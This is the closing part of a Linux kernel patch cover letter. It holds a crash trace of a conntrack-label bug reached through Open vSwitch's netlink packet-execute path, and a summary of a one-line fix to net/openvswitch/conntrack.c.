[  479.509262][ T9977]  ? nf_ct_ext_add+0x2f2/0x420
[  479.510059][ T9977]  report_bug+0x9c/0x1e0
[  479.510763][ T9977]  ? nf_ct_ext_add+0x2f2/0x420
[  479.511549][ T9977]  handle_bug+0x121/0x2a0
[  479.512181][ T9977]  exc_invalid_op+0x17/0x50
[  479.512793][ T9977]  asm_exc_invalid_op+0x1a/0x20
[  479.513435][ T9977] RIP: 0010:nf_ct_ext_add+0x2f2/0x420
[  479.514148][ T9977] Code: 4c 24 08 48 c1 ea 03 0f b6 14 02 48 89 f8 83 e0 07 83 c0 03 38 d0 7c 08 84 d2 0f 85 25 01 00 00 44 89 75 0c e9 cb fe ff ff 90 <0f> 0b 90 e9 64 fd ff ff 4c 89 4c 24 08 44 89 14 24 e8 f8 7e 32 f9
[  479.516689][ T9977] RSP: 0018:ffa0000012ff7100 EFLAGS: 00010202
[  479.517591][ T9977] RAX: 0000000000000008 RBX: ff1100010ef24100 RCX: ffffffff88eb7c13
[  479.518863][ T9977] RDX: 1fe2200021de4820 RSI: 0000000000000008 RDI: ff1100010ef24100
[  479.520124][ T9977] RBP: 0000000000000007 R08: 0000000000000000 R09: ffe21c0021de4820
[  479.521374][ T9977] R10: ff1100010ef24107 R11: ff1100010ef24040 R12: ff1100010ef24040
[  479.522661][ T9977] R13: ffffffff9a67b0c0 R14: 0000000000000820 R15: ff11000113724a20
[  479.523950][ T9977]  ? nf_ct_ext_add+0x33/0x420
[  479.524750][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.525691][ T9977]  ovs_ct_get_conn_labels+0x110/0x1e0
[  479.526577][ T9977]  ovs_ct_execute+0x1499/0x23c0
[  479.527367][ T9977]  ? is_bpf_text_address+0x6e/0x100
[  479.528213][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.529107][ T9977]  ? kernel_text_address+0x153/0x170
[  479.529964][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.530909][ T9977]  ? __pfx_ovs_ct_execute+0x10/0x10
[  479.531789][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.532711][ T9977]  ? stack_trace_save+0x93/0xd0
[  479.533516][ T9977]  do_execute_actions+0x91a/0x7400
[  479.534374][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.535302][ T9977]  ? add_lock_to_list+0x9d/0x130
[  479.536116][ T9977]  ? __pfx_do_execute_actions+0x10/0x10
[  479.537018][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.537994][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.538908][ T9977]  ? __lock_acquire+0x1025/0x25f0
[  479.539754][ T9977]  ? trace_kmalloc+0xe3/0x110
[  479.540545][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.541448][ T9977]  ? lock_acquire+0x1ab/0x360
[  479.542224][ T9977]  ovs_execute_actions+0xe4/0x440
[  479.543067][ T9977]  ovs_packet_cmd_execute+0xc16/0x13e0
[  479.543967][ T9977]  ? __pfx_ovs_packet_cmd_execute+0x10/0x10
[  479.544937][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.545849][ T9977]  ? __nla_parse+0x24/0x30
[  479.546593][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.547492][ T9977]  ? genl_family_rcv_msg_attrs_parse.isra.0+0x17f/0x290
[  479.548659][ T9977]  genl_family_rcv_msg_doit+0x1e5/0x2c0
[  479.549574][ T9977]  ? __pfx_genl_family_rcv_msg_doit+0x10/0x10
[  479.550555][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.551506][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.552423][ T9977]  ? security_capable+0x8a/0x150
[  479.553246][ T9977]  genl_rcv_msg+0x432/0x6f0
[  479.554015][ T9977]  ? __pfx_genl_rcv_msg+0x10/0x10
[  479.554857][ T9977]  ? __pfx_ovs_packet_cmd_execute+0x10/0x10
[  479.555743][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.556502][ T9977]  ? __lock_acquire+0x45c/0x25f0
[  479.557192][ T9977]  netlink_rcv_skb+0x124/0x350
[  479.557847][ T9977]  ? __pfx_genl_rcv_msg+0x10/0x10
[  479.558555][ T9977]  ? __pfx_netlink_rcv_skb+0x10/0x10
[  479.559306][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.560078][ T9977]  ? netlink_deliver_tap+0x14b/0xaa0
[  479.560811][ T9977]  genl_rcv+0x28/0x40
[  479.561357][ T9977]  netlink_unicast+0x471/0x780
[  479.562021][ T9977]  ? __pfx_netlink_unicast+0x10/0x10
[  479.562750][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.563501][ T9977]  ? __check_object_size+0x468/0x600
[  479.564238][ T9977]  netlink_sendmsg+0x75e/0xc40
[  479.564846][ T9977]  ? __pfx_netlink_sendmsg+0x10/0x10
[  479.565448][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.566072][ T9977]  ? __import_iovec+0x33d/0x5b0
[  479.566661][ T9977]  ____sys_sendmsg+0x817/0xa20
[  479.567321][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.568099][ T9977]  ? __pfx_____sys_sendmsg+0x10/0x10
[  479.568822][ T9977]  ? __pfx_copy_msghdr_from_user+0x10/0x10
[  479.569636][ T9977]  ? __pfx_filemap_map_pages+0x10/0x10
[  479.570392][ T9977]  ___sys_sendmsg+0x104/0x190
[  479.571043][ T9977]  ? __pfx____sys_sendmsg+0x10/0x10
[  479.571757][ T9977]  ? do_fault+0x7c3/0x1230
[  479.572398][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.573155][ T9977]  ? __lock_acquire+0x45c/0x25f0
[  479.573655][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.574106][ T9977]  __sys_sendmsg+0x124/0x1c0
[  479.574478][ T9977]  ? __pfx___sys_sendmsg+0x10/0x10
[  479.574904][ T9977]  ? srso_alias_return_thunk+0x5/0xfbef5
[  479.575324][ T9977]  ? rcu_is_watching+0x12/0xc0
[  479.575710][ T9977]  do_syscall_64+0x116/0xf80
[  479.576061][ T9977]  ? irqentry_exit+0x117/0x830
[  479.576440][ T9977]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  479.576906][ T9977] RIP: 0033:0x7feb7ad3c687
[  479.577265][ T9977] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  479.578728][ T9977] RSP: 002b:00007ffc75772a70 EFLAGS: 00000202 ORIG_RAX: 000000000000002e
[  479.579379][ T9977] RAX: ffffffffffffffda RBX: 00007feb7aba0780 RCX: 00007feb7ad3c687
[  479.580009][ T9977] RDX: 0000000000000000 RSI: 00007ffc75772ae0 RDI: 0000000000000003
[  479.580628][ T9977] RBP: 00007ffc75774c70 R08: 0000000000000000 R09: 0000000000000000
[  479.581249][ T9977] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000000
[  479.581869][ T9977] R13: 0000000000000000 R14: 0000000000000004 R15: 0000000000000018
[  479.582514][ T9977]  </TASK>
[  479.583596][ T9977] Kernel Offset: disabled
[  479.583954][ T9977] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  openvswitch: avoid reallocating confirmed conntrack labels

 net/openvswitch/conntrack.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

-- 
2.43.0

